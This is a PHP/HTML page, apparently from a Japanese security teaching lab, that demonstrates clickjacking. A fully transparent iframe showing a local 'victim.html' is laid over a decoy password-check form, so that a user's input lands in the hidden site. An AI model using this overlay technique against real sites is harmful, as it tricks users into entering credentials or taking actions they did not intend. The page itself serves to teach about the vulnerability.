<?php

// セッションを開始
session_start();

?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>クリックジャッキングデモ</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
        }
        iframe {
            position: absolute;
            top: 243px;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0; /* フレームを透明にする */
            z-index: 2;
        }
        #evil-form {
            position: absolute;
            top: 338px;
            left: 40px;
            z-index: 2;
        }
        pre {
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            white-space: pre-line;
        }
    </style>
</head>
<body>
    <p><a href="/">戻る</a></p>
    <h1>クリックジャッキングの脆弱性があるサイト</h1>
    <div>
        説明
        <pre>
            このサイトは、クリックジャッキングの脆弱性がある為、<br/>悪意のあるユーザーによって、以下のような攻撃が可能です。
            <br/>
            以下のメールアドレス入力欄は、悪意のあるユーザーが意図的に透明なiframeを被害者サイトの上に重ね、
            <br/>
            被害者が意図しないメールアドレスを入力させるように誘導する攻撃が可能です。
        </pre>
    </div>
    <form method="post" action="#" id="evil-form" >
        <label for="message">登録可能なパスワードか否かを確認してください。</label><br>
        <input type="password" name="password" id="password" /><br><br>
        <button>確認する</button>
    </form>
    <!-- 透明なiframeで被害者サイトを表示 -->
    <iframe src="./victim.html"></iframe>
</body>
</html>
